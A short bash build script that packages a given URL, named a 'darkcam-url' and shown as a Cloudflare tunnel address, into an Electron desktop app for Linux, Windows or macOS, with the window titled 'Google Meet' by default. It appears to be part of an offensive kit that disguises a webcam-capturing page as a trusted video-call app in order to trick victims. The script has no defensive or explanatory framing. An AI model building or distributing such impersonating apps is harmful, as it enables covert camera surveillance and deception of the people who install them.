#!/bin/bash
# Usage:
#   ./build.sh https://xyz.trycloudflare.com          → AppImage (Linux)
#   ./build.sh https://xyz.trycloudflare.com win       → .exe (needs Wine)
#   ./build.sh https://xyz.trycloudflare.com mac       → .dmg
#
# Optional env vars:
#   TITLE="Google Meet"   APP_W=1280   APP_H=800

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

URL="${1:?Usage: ./build.sh <darkcam-url> [linux|win|mac]}"
PLATFORM="${2:-linux}"
TITLE="${TITLE:-Google Meet}"
APP_W="${APP_W:-1280}"
APP_H="${APP_H:-800}"

# ── Write config ─────────────────────────────────────────────────────────────
cat > config.json <<JSON
{
  "url":    "$URL",
  "title":  "$TITLE",
  "width":  $APP_W,
  "height": $APP_H
}
JSON
echo "[*] config.json written → $URL"

# ── Install deps (first run) ─────────────────────────────────────────────────
if [ ! -d node_modules ]; then
  echo "[*] Installing npm deps..."
  npm install --save-dev electron electron-builder
fi

# ── Build ────────────────────────────────────────────────────────────────────
echo "[*] Building for $PLATFORM..."
case "$PLATFORM" in
  win)   npm run build:win   ;;
  mac)   npm run build:mac   ;;
  *)     npm run build:linux ;;
esac

echo ""
echo "[+] Build complete → electron/dist/"
ls dist/ 2>/dev/null || true
